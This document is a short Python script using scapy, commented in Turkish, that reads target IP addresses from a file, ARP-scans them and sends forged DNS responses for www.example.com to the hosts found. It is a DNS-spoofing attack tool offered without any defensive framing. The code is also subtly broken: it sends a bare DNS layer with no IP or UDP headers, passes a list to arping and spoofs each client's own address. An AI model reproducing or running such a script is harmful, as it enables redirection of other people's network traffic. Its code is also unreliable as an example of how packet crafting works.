import scapy.all as scapy

def get_target_ips():
    # Hedef sistemlerin IP adreslerini belirle
    with open("target_ips.txt", "r") as f:
        target_ips = f.readlines()
        target_ips = [ip.strip() for ip in target_ips]
    return target_ips

def get_dns_clients_ips():
    # DNS istemcilerinin IP adreslerini belirle
    ans, unans = scapy.arping(target_ips)
    dns_clients_ips = [ans[i].src for i in range(len(ans))]
    return dns_clients_ips

def send_fake_dns_responses():
    # Sahte DNS yanıtları oluştur ve hedef sistemlere gönder
    for target_ip in target_ips:
        for dns_client_ip in dns_clients_ips:
            # Sahte DNS yanıtı oluştur
            fake_dns_response = scapy.DNS()
            fake_dns_response.id = 1234
            fake_dns_response.qr = 1
            fake_dns_response.opcode = 0
            fake_dns_response.qdcount = 1
            fake_dns_response.ancount = 1
            fake_dns_response.qd = scapy.DNSQR(qname="www.example.com")
            fake_dns_response.an = scapy.DNSRR(rrname="www.example.com", ttl=300, rdata=dns_client_ip)

            # Sahte DNS yanıtını hedef sistemlere gönder
            scapy.send(fake_dns_response, verbose=0, iface="eth0")

if __name__ == "__main__":
    # Hedef sistemlerin IP adreslerini belirle
    target_ips = get_target_ips()

    # DNS istemcilerinin IP adreslerini belirle
    dns_clients_ips = get_dns_clients_ips()

    # Sahte DNS yanıtları oluştur ve hedef sistemlere gönder
    send_fake_dns_responses()
